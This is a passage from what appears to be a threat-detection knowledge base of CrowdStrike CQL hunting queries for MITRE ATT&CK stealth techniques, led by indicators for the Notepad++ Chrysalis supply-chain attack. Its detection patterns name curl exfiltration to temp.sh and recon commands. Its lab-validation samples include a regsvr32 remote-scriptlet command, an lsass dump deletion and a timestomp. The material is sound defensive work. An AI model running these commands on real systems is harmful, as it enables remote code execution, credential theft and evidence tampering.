> tags:: CQL, MITRE/Stealth, CQL_Hub

* Detection Objective: This query detects a state-sponsored supply chain attack where the legitimate Notepad++ updater (gup.exe) is hijacked to download the Chrysalis backdoor. It identifies the attack by spotting unauthorized network connections from the updater, malicious DLL side-loading (e.g., BluetoothService.exe loading log.dll), and data exfiltration commands involving curl and temp.sh.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`notepad_plus_plus_supply_chain_attack.yml`), author: Aamir Muhammad.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
|case{
#event_simpleName=/DNS/iF ContextBaseFileName=/^gup\.exe$/iF DomainName!=/github.com|notepad-plus-plus.org|.globalsign.com|release-assets.githubusercontent.com/iF| DetectionLogic := "GUP beacon to C2C" | Indicator := DomainName | Risk := "HIGH";
in(field="SHA256HashData", values=["02368c6b62cb392dddd35cfc6cb8c1154f7ebdceb9fb559cefc301982d6fbbf9","0dcd846cdfdc793fab39a3c9860e0f6ab68cdbdcf4b03a87e8a02df0d3e1249f","5dd766a7a378c97eb8c9fe9a4bff678e3c9a05386911f4296e094407b99c23d2","6a7a8aa91109c25d57fe2ca71c150ca09afc1bf10c98376adf959dbc91010394","a511be5164dc1122fb5a7daa3eef9467e43d8458425b15a640235796006590c9","078a9e5c6c787e5532a7e728720cbafee9021bfec4a30e3c2be110748d7c43c5","0a9b8df968df41920b6ff07785cbfebe8bda29e6b512c94a3b2a83d10014d2fd","2da00de67720f5f13b17e9d985fe70f10f153da60c9ab1086fe58f069a156924","3bdc4c0637591533f1d4198a72a33426c01f69bd2e15ceee547866f65e26b7ad","4a52570eeaf9d27722377865df312e295a7a23c3b6eb991944c2ecd707cc9906","4c2ea8193f4a5db63b897a2d3ce127cc5d89687f380b97a1d91e0c8db542e4f8","77bfea78def679aa1117f569a35e8fd1542df21f7e00e27f192c907e61d63a2e","7add554a98d3a99b319f2127688356c1283ed073a084805f14e33b4f6a6126fd","831e1ea13a1bd405f5bda2b9d8f2265f7b1db6c668dd2165ccc8a9c4c15ea7dd","8ea8b83645fba6e23d48075a0d3fc73ad2ba515b4536710cda4f1f232718f53e","9276594e73cda1c69b7d265b3f08dc8fa84bf2d6599086b9acc0bb3745146600","a511be5164dc1122fb5a7daa3eef9467e43d8458425b15a640235796006590c9","b4169a831292e245ebdffedd5820584d73b129411546e7d3eccf4663d5fc5be3","e7cd605568c38bd6e0aba31045e1633205d0598c607a855e2e1bca4cca1c6eda","f4d829739f2d6ba7e3ede83dad428a0ced1a703ec582fc73a4eee3df3704629a","fcc2765305bcd213b7558025b2039df2265c3e0b6401e4833123c461df2de51a"],ignoreCase=true)| DetectionLogic := "Malicious SHA256 Hash Execution" | Indicator := SHA256HashData | Risk := "HIGH";
in(field="SHA1HashData", values=["06a6a5a39193075734a32e0235bde0e979c27228","07d2a01e1dc94d59d5ca3bdf0c7848553ae91a51","0d0f315fd8cf408a483f8e2dd1e69422629ed9fd","13179c8f19fbf3d8473c49983a199e6cb4f318f0","21a942273c14e4b9d3faa58e4de1fd4d5014a1ed","259cd3542dea998c57f67ffdd4543ab836e3d2a3","2a476cfb85fbf012fdbe63a37642c11afa5cf020","2ab0758dda4e71aee6f4c8e4c0265a796518f07d","3090ecf034337857f786084fb14e63354e271c5d","46654a7ad6bc809b623c51938954de48e27a5618","4c9aac447bf732acc97992290aa7a187b967ee2c","573549869e84544e3ef253bdba79851dcde4963a","6444dab57d93ce987c22da66b3706d5d7fc226da","73d9d0139eaf89b7df34ceeb60e5f8c7cd2463bf","7e0790226ea461bcc9ecd4be3c315ace41e1c122","813ace987a61af909c053607635489ee984534f4","821c0cafb2aab0f063ef7e313f64313fc81d46cd","8e6e505438c21f3d281e1cc257abdbf7223b7f5a","90e677d7ff5844407b9c073e3b7e896e078e11cd","94dffa9de5b665dc51bc36e2693b8a3a0a4cc6b8","9c0eff4deeb626730ad6a05c85eb138df48372ce","9c3ba38890ed984a25abb6a094b5dbf052f22fa7","9df6ecc47b192260826c247bf8d40384aa6e6fd6","9fbf2195dee991b1e5a727fd51391dcc2d7a4b16","bd4915b3597942d88f319740a9b803cc51585c4a","bf996a709835c0c16cce1015e6d44fc95e08a38a","c68d09dd50e357fd3de17a70b7724f8949441d77","ca4b6fe0c69472cd3d63b212eb805b7f65710d33","d0662eadbe5ba92acbd3485d8187112543bcfbf5","d7ffd7b588880cf61b603346a3557e7cce648c93","da39a3ee5e6b4b0d3255bfef95601890afd80709","defb05d5a91e4920c9e22de2d81c5dc9b95a9a7c","f7910d943a013eede24ac89d6388c1b98f8b3717"],ignoreCase=true)| DetectionLogic := "Malicious SHA1 Hash Execution" | Indicator := SHA1HashData | Risk := "HIGH";
in(field="RemoteAddressIP6", values=["2001:19f0:6801:950:5400:5ff:feb2"])| DetectionLogic := "C2C IPv6" | Indicator := RemoteAddressIP6 | Risk := "MEDIUM";
in(field="RemoteIP", values=["124.222.137.114","138.0.0.0","140.0.0.0","45.32.144.255","45.76.155.202","45.77.31.210","59.110.7.32","95.179.213.0","212.30.60.8","94.190.195.237","146.70.113.105","194.114.136.211","8.216.128.215","116.251.216.119","217.69.5.44","188.166.199.140","61.4.102.97","172.233.246.7"])| DetectionLogic := "C2C IP" | Indicator := RemoteIP | Risk := "MEDIUM";
in(field="DomainName", values=["api.skycloudcenter.com","api.wiresguard.com","cdncheck.it.com","proshow.crs","proshow.phd","safe-dns.it.com","skycloudcenter.com","temp.sh","wiresguard.com"],ignoreCase=true) | DetectionLogic := "C2C Domain" | Indicator := DomainName | Risk := "MEDIUM";
ImageFileName=/\\(BluetoothService|system|loader1|loader2|s047t5g|ConsoleApplication2|3yzr31vk|uffhxpSy)\.exe$/i | DetectionLogic := "Suspicious Filename" | Indicator := ImageFileName | Risk := "LOW";
 #event_simpleName=ClassifiedModuleLoad
|rename(field="ImageFileName", as="DllLoadImageFileName")
|rename(field="TargetImageFileName", as="ProcessName")
|(ProcessName=/BluetoothService.exe/iF and DllLoadImageFileName=/log.dll/iF)
 OR (OriginalFilename=/BDSubWiz.exe/iF and DllLoadImageFileName=/log.dll/iF)
 OR (ProcessName=/svchost.exe/iF and DllLoadImageFileName=/libtcc.dll/iF)
  OR (ProcessName=/ConsoleApplication.*\.exe/iF and DllLoadImageFileName=/clipc.dll/iF)| DetectionLogic := "Suspicious DLL SideLoading" | Indicator := DllLoadImageFileName | Risk := "HIGH"; 
ImageFileName=/\\(u\.bat|conf\.c)$/i | DetectionLogic := "Suspicious Script/Code" | Indicator := ImageFileName | Risk := "MEDIUM";
CommandLine=/curl.exe/iF CommandLine=/-F.*\.txt.*temp.sh/iF | DetectionLogic := "Exfiltration" | Indicator := CommandLine | Risk := "HIGH";
CommandLine=/cmd.*\/c.*>.*.txt/iF CommandLine=/whoami|tasklist|systeminfo|netstat -ano/iF | DetectionLogic := "Recon" | Indicator := CommandLine | Risk := "MEDIUM";
#event_simpleName=/Written/iF (FilePath=/\\ProShow\\load|\Bluetooth\\BluetoothService|\\Adobe\\Scripts/iF or ImageFileName=/\\Adobe\\Scripts\\alien.ini/iF)| DetectionLogic := "2dary Payload write" | Indicator := FileName | Risk := "MEDIUM";
#event_simpleName=/ProcessAncestryInformation|Processrollup2/iF ParentBaseFileName=/^gup\.exe$/iF FileName!=/explorer.exe|^npp\..*\.Installer.*\.exe$/iF FileName=/update.*\.exe|AutoUpdater\.exe|curl\.exe|cmd\.exe|powershell\.exe|wscript\.exe|cscript\.exe|rundll32\.exe/iF or FilePath=/\\Temp\\|\\tmp\\|AppData\\Local\\/iF| DetectionLogic := "Initial Malicious Execution" | Indicator := FileName | Risk := "HIGH";
}

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: https://notepad-plus-plus.org/news/hijacked-incident-info-update/ https://notepad-plus-plus.org/news/clarification-security-incident/  https://securelist.com/notepad-supply-chain-attack/118708/ https://notepad-plus-plus.org/assets/data/IoCFromFormerHostingProvider.txt https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/
* Key Indicators: Review query output fields and filters from `notepad_plus_plus_supply_chain_attack.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1036]] - Masquerading

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1036
> technique_name:: Masquerading
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Stealth

* Detection Objective: Detect system-binary names executing from non-system paths, a common masquerading pattern used to blend into process lists.
* Telemetry Requirements: ProcessRollup2, ImageHash

#### Production-Ready CQL Query:

```cql
// Title: System Binary Name from Non-System Path
// Focus: svchost/lsass/spoolsv/csrss-like names outside Windows directories
#event_simpleName=ProcessRollup2
| FileName=/^(svchost|lsass|csrss|spoolsv|services|winlogon|explorer)\.exe$/i
| NOT ImageFileName=/\\Windows\\(System32|SysWOW64)\\/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, FileName, CommandLine, SHA256HashData])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Trusted Windows filename but image path is user-writable or otherwise outside Windows system directories.
* Triage Steps: Hash and signer check the binary; review file creation source and process tree.
* Potential False Positives: Very rare; some vendor test tools may copy system-like names.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"svchost.exe","ImageFileName":"\\Device\\HarddiskVolume3\\Users\\Public\\svchost.exe"}
```

---

### [[T1027]] - Obfuscated Files or Information

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1027
> technique_name:: Obfuscated Files or Information
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: High
> tags:: CQL, MITRE/Stealth

* Detection Objective: Detect encoded, compressed, or string-reversal execution patterns used to hide script content.
* Telemetry Requirements: ProcessRollup2, ScriptControlScanInfo

#### Production-Ready CQL Query:

```cql
// Title: Encoded or Obfuscated Script Execution
// Focus: Base64, FromCharCode, reverse, compression, and encoded flags
#event_simpleName=ProcessRollup2
| ImageFileName=/\\(powershell|pwsh|cmd|wscript|cscript|mshta|node|python)\.exe$/i
| CommandLine=/(-enc\b|-encodedcommand|FromBase64String|ToBase64String|FromCharCode|char\[\]|-join|GzipStream|DeflateStream|reverse\(|\^\^|`{2,})/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Encoding/compression/string construction tokens in interpreter command lines.
* Triage Steps: Decode command content and inspect child processes/network.
* Potential False Positives: Legitimate encoded admin scripts and deployment tools.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"powershell.exe","CommandLine":"powershell -enc SQBFAFgA"}
```

---

### [[T1027]] - Obfuscated Files or Information — CQL Hub: JAR files written to %AppData%

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1027
> technique_name:: Obfuscated Files or Information
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: jar_file_written_to_appdata.yaml
> cql_hub_name:: JAR files written to %AppData%
> cql_hub_author:: CrowdStrike
> cql_hub_mitre_ids:: T1027
> related_mitre_ids:: T1027
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Stealth, CQL_Hub

* Detection Objective: This query detects if a JAR file was written to the %AppData% folder

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`jar_file_written_to_appdata.yaml`), author: CrowdStrike.
* Original CQL Hub MITRE IDs: T1027.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
#event_simpleName=JarFileWritten 
| TargetFileName=/\\AppData\\/i
| table([aid, @timestamp, TargetFileName, SHA256HashData], limit=1000)

```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `jar_file_written_to_appdata.yaml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1070.004]] - File Deletion

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1070.004
> technique_name:: File Deletion
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Stealth

* Detection Objective: Detect command-line deletion of logs, staged payloads, scripts, or forensic artifacts from common staging directories.
* Telemetry Requirements: ProcessRollup2, FileDeleted

#### Production-Ready CQL Query:

```cql
// Title: Suspicious Artifact Deletion
// Focus: del/remove-item/wevtutil targeting logs, dumps, scripts, or temp payloads
#event_simpleName=ProcessRollup2
| ImageFileName=/\\(cmd|powershell|pwsh|del|erase|sdelete|cipher)\.exe$/i
| CommandLine=/(del\s+|erase\s+|Remove-Item|sdelete|cipher\s+\/w).*(\\Temp\\|\\ProgramData\\|\\Users\\Public\\|\.ps1|\.vbs|\.js|\.dmp|\.log|\.evtx)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Deletion verbs aimed at staging paths or forensic artifacts.
* Triage Steps: Determine what was deleted and recover from EDR/file-system telemetry if possible.
* Potential False Positives: Installers and cleanup scripts.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"powershell.exe","CommandLine":"Remove-Item C:\\Users\\Public\\lsass.dmp -Force"}
```

---

### [[T1070.006]] - Timestomp

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1070.006
> technique_name:: Timestomp
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Stealth

* Detection Objective: Detect attempts to change file timestamps via PowerShell, copy timestamp tricks, or timestomp tooling.
* Telemetry Requirements: ProcessRollup2, FileWritten

#### Production-Ready CQL Query:

```cql
// Title: File Timestamp Manipulation
// Focus: CreationTime/LastWriteTime manipulation from script or tool
#event_simpleName=ProcessRollup2
| ImageFileName=/\\(powershell|pwsh|cmd|touch|timestomp)\.exe$/i
| CommandLine=/(CreationTime|LastWriteTime|LastAccessTime|Set-ItemProperty|Get-Item.+\.LastWriteTime|timestomp|touch\s+-t|copy\s+\/b)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Timestamp property manipulation tokens.
* Triage Steps: Inspect target file path, original creation telemetry, and associated process tree.
* Potential False Positives: Build scripts and developer tooling.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"powershell.exe","CommandLine":"(Get-Item C:\\ProgramData\\a.dll).LastWriteTime=(Get-Date).AddYears(-3)"}
```

---

### [[T1218.010]] - Regsvr32

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1218.010
> technique_name:: Regsvr32
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: High
> tags:: CQL, MITRE/Stealth

* Detection Objective: Detect regsvr32 scriptlet or remote COM script execution.
* Telemetry Requirements: ProcessRollup2

#### Production-Ready CQL Query:

```cql
// Title: Regsvr32 Scriptlet or Remote Execution
// Focus: scrobj.dll, /i URL, scriptlet, or untrusted DLL path
#event_simpleName=ProcessRollup2
| ImageFileName=/\\regsvr32\.exe$/i
| CommandLine=/(scrobj\.dll|\/i:|http|https|scriptlet|\.sct|\\Users\\|\\ProgramData\\|\\Temp\\)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: regsvr32 with scrobj/scriptlet/remote URL or untrusted path.
* Triage Steps: Retrieve scriptlet/DLL and examine parent process; correlate to C2/download telemetry.
* Potential False Positives: Software registration tasks; remote scriptlet should be extremely rare.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"regsvr32.exe","CommandLine":"regsvr32 /s /n /u /i:http://host/a.sct scrobj.dll"}
```

---

### [[T1218.010]] - Regsvr32 — CQL Hub: LOLBin Regsvr32

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1218.010
> technique_name:: Regsvr32
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: LOLBin_Regsvr32.yml
> cql_hub_name:: LOLBin Regsvr32
> cql_hub_author:: ByteRay GmbH
> cql_hub_mitre_ids:: T1218.010
> related_mitre_ids:: T1218.010
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Stealth, CQL_Hub

* Detection Objective: This query detects the use of Regsvr32 when it has loaded scrobj.dll.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`LOLBin_Regsvr32.yml`), author: ByteRay GmbH.
* Original CQL Hub MITRE IDs: T1218.010.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
in(#event_simpleName, values=["ProcessRollup2","ProcessBlocked"])
| event_platform=Win
| ImageFileName=/regsvr32.exe/i CommandLine=/scrobj.dll/i CommandLine=/i:/i

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: Regsvr32.exe – A native Windows tool designed to register DLLs, but frequently misused by attackers to execute remote or local scriptlets (SCT files)—often enabling Application Whitelisting bypass and stealthy code execution.  [LOLBAS - Regsvr32.exe](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/)
* Key Indicators: Review query output fields and filters from `LOLBin_Regsvr32.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1127]] - Trusted Developer Utilities Proxy Execution

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1127
> technique_name:: Trusted Developer Utilities Proxy Execution
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: High
> tags:: CQL, MITRE/Stealth

* Detection Objective: Detect msbuild/csc/installutil/regasm-style proxy execution of inline or downloaded code.
* Telemetry Requirements: ProcessRollup2

#### Production-Ready CQL Query:

```cql
// Title: Trusted Developer Utility Proxy Execution
// Focus: MSBuild/InstallUtil/Csc suspicious inline compile or remote project usage
#event_simpleName=ProcessRollup2
| ImageFileName=/\\(msbuild|csc|installutil|regasm|regsvcs|msxsl)\.exe$/i
| CommandLine=/(http|https|\\Users\\|\\ProgramData\\|\\Temp\\|\.xml|\.csproj|\/target:exe|\/unsafe|InstallUtil)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Developer utility execution with remote/untrusted project or compile switches.
* Triage Steps: Review project/source content and whether host is a developer machine.
* Potential False Positives: Developer builds and enterprise installers.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"msbuild.exe","CommandLine":"msbuild C:\\Users\\Public\\payload.csproj"}
```

---

### [[T1497]] - Virtualization/Sandbox Evasion

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1497
> technique_name:: Virtualization/Sandbox Evasion
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Stealth

* Detection Objective: Detect scripts querying VM/sandbox artifacts before execution.
* Telemetry Requirements: ProcessRollup2, RegistryValueSet

#### Production-Ready CQL Query:

```cql
// Title: Sandbox or VM Artifact Discovery
// Focus: VMware/VirtualBox/Hyper-V artifact queries
#event_simpleName=ProcessRollup2
| ImageFileName=/\\(powershell|pwsh|wmic|reg|cmd)\.exe$/i
| CommandLine=/(VMware|VirtualBox|VBOX|QEMU|Hyper-V|Sandbox|SbieDll|vmsrvc|vmtools|Win32_BIOS|Win32_ComputerSystem|SystemBiosVersion)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: VM/sandbox artifact strings and WMI/registry queries.
* Triage Steps: Review parent process and whether the check gates payload execution.
* Potential False Positives: Asset inventory and virtualization management scripts.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"wmic.exe","CommandLine":"wmic computersystem get manufacturer,model"}
```

---

### [[T1014]] - Rootkit — CQL Hub: Enumerate Windows Driver Loads

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1014
> technique_name:: Rootkit
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: Enumerate_Windows_Driver_Loads.yml
> cql_hub_name:: Enumerate Windows Driver Loads
> cql_hub_author:: CrowdStrike
> related_mitre_ids:: T1014
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Stealth, CQL_Hub

* Detection Objective: The query combines DriverLoad and Event_ModuleSummaryInfoEvent data to associate loaded driver hashes with their certificate details, simplifying file paths and aggregating filenames, subjects, and issuers for analysis of driver authenticity.
* Telemetry Requirements: Endpoint
* Source: CQL Hub (`Enumerate_Windows_Driver_Loads.yml`), author: CrowdStrike.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
// Get all DriverLoad events and Event_ModuleSummaryInfoEvent events so certificate data can be merged in
(#event_simpleName=DriverLoad event_platform=Win) OR (#repo=detections ExternalApiType=Event_ModuleSummaryInfoEvent )
// Shorten file path from DriverLoad event
| case{
    #event_simpleName=DriverLoad | FilePath=/Device\\HarddiskVolume\d+(?<ShortFileParth>.+$)/;
    *;
}
// Create selfJoinFilter
| selfJoinFilter(field=[SHA256HashData], where=[{#event_simpleName=DriverLoad}, {#repo=detections ExternalApiType=Event_ModuleSummaryInfoEvent}])
// Aggregate
| groupBy([SHA256HashData], function=([collect([ShortFileParth, FileName, OriginalFilename, SubjectCN, IssuerCN])]), limit=max)
| FileName=*
// Set default values
| default(value="-", field=[SubjectCN, IssuerCN, OriginalFilename])

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: Reference: [GitHub CrowdStrike/logscale-community](https://github.com/CrowdStrike/logscale-community-content/blob/main/Queries-Only/Helpful-CQL-Queries/Enumerate%20Windows%20Driver%20Loads.md)
* Key Indicators: Review query output fields and filters from `Enumerate_Windows_Driver_Loads.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1014]] - Rootkit — CQL Hub: Check Domain Controller for NSX Driver

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1014
> technique_name:: Rootkit
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: check_domain_controller_for_nsx_driver.yml
> cql_hub_name:: Check Domain Controller for NSX Driver
> cql_hub_author:: ByteRay GmbH
> related_mitre_ids:: T1014
> required_modules:: Insight
> cql_hub_tags:: Monitoring
> tags:: CQL, MITRE/Stealth, CQL_Hub

* Detection Objective: This query helps to determine if NSX drivers are installed on Domain Controllers to investigate limited Identity Protection functionality.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`check_domain_controller_for_nsx_driver.yml`), author: ByteRay GmbH.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight; VMware NSX telemetry. Validate that this telemetry/module exists in the environment before operational use.

```cql
event_platform=/Win/i #event_simpleName=/DriverLoad/i 
| in(field=FileName,values=["vnetwfp.sys", "vnetflt.sys"],ignoreCase=true) 
| join({$falcon/investigate:aid_master()}, field=aid, key=aid, include=[ProductType]) 
| ProductType=2 
| "Domain Controller":=ComputerName 
| LocalIP:=LocalAddressIP4 
| Drivers:=FileName 
| groupBy([aid,"Domain Controller",LocalIP,Drivers],function=[])

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: ## Related CrowdStrike KBs  1. [Resolving Falcon Identity Protection conflicting with VMware tools and NSX Driver](https://supportportal.crowdstrike.com/s/article/ka16T000001Mle7QAC)   2. [Verify NSX driver installation on Domain Controllers](https://supportportal.crowdstrike.com/s/article/ka16T000001tkTHQAY)
* Key Indicators: Review query output fields and filters from `check_domain_controller_for_nsx_driver.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1078]] - Valid Accounts — CQL Hub: Honeytoken Account Logon Activity

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1078
> technique_name:: Valid Accounts
> logscale_stream:: Identity
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: Honey_Token_Account_Logon.yml
> cql_hub_name:: Honeytoken Account Logon Activity
> cql_hub_author:: ByteRay GmbH
> cql_hub_mitre_ids:: T1078
> related_mitre_ids:: T1078
> required_modules:: Identity
> cql_hub_tags:: Detection
> tags:: CQL, MITRE/Stealth, CQL_Hub

* Detection Objective: This query detects logon activity associated with a honeytoken account. Honeytokens are decoy accounts designed to lure attackers, and any activity on them is a strong indicator of compromise.
* Telemetry Requirements: Identity
* Source: CQL Hub (`Honey_Token_Account_Logon.yml`), author: ByteRay GmbH.
* Original CQL Hub MITRE IDs: T1078.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Identity. Validate that this telemetry/module exists in the environment before operational use.

```cql
// Detects logins involving default administrator accounts
#event_simpleName=/UserLogon.*/i
// Adjust or extend this to match your custom honeytoken accounts
| UserSid = /S-1-5-21-\d*-\d*-\d*-500/i

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: ### Honeytoken Account Access Detection  This use case is designed to generate an alert when any activity involving a designated **honeytoken account** is observed. Honeytokens serve as decoys; they are accounts that appear valuable to an attacker but have no legitimate purpose and are heavily monitored. Any interaction with them is highly indicative of malicious activity.  **Key Objectives:** - **Lure Attackers**: Create accounts that mimic administrator or service accounts to attract adversarial engagement. - **High-Fidelity Alerts**: Since these accounts have no legitimate use, any logon event is a high-confidence signal of a breach. - **Monitor and Safeguard**: Apply Identity Protection policies to monitor these accounts without granting them any actual permissions, making them safe and effective traps.  --- #### Query Breakdown:  1. **`#event_simpleName=/UserLogon.*/i`**    - This line filters for all logon-related events captured by CrowdStrike Falcon. It serves as the primary data source for the detection.  2. **`| UserSid = /S-1-5-21-\d*-\d*-\d*-500/i`**    - This filters the logon events for a specific Security Identifier (SID). The SID `S-1-5-21-...-500` is the well-known SID for the default local administrator account on a Windows domain.    - **Crucially**, this value must be replaced with the actual SID(s) of your organization's designated honeytoken accounts.  For more details on creating and managing honeytokens within Falcon Identity Protection, please refer to the official CrowdStrike documentation: - [Honeytokens within Falcon Identity Protection](https://supportportal.crowdstrike.com/s/article/ka16T000001MfykQAC)
* Key Indicators: Review query output fields and filters from `Honey_Token_Account_Logon.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1078]] - Valid Accounts — CQL Hub: Account Enabled (Microsoft Defender for Identity)

> [!metadata]+ Detection Metadata
> tactic:: Stealth
> technique_id:: T1078
> technique_name:: Valid Accounts
> logscale_stream:: Identity
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: account_enabled_microsoft_defender_for_identity.yml
> cql_hub_name:: Account Enabled (Microsoft Defender for Identity)
> cql_hub_author:: Kundan Kumar
> cql_hub_mitre_ids:: T1078
> related_mitre_ids:: T1078
> required_modules:: Identity
> cql_hub_tags:: Detection
> tags:: CQL, MITRE/Stealth, CQL_Hub

* Detection Objective: Detects when a previously disabled user account is re‑enabled in Active Directory. While this may be part of normal administrative activity, it can also indicate an attempt to restore access to an account for unauthorized use and should be reviewed.

* Telemetry Requirements: Identity
